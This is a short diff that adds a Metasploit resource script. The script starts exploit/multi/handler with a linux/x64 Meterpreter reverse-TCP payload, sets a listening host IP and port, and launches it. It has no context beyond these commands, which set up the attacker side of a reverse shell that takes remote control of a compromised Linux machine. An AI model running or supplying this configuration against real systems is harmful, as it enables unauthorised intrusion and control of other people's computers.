@@ -1,0 +1,6 @@
+use exploit/multi/handler
+use 4
+set payload linux/x64/meterpreter_reverse_tcp
+set lhost 111.11.11.10
+set lport 65321
+exploit
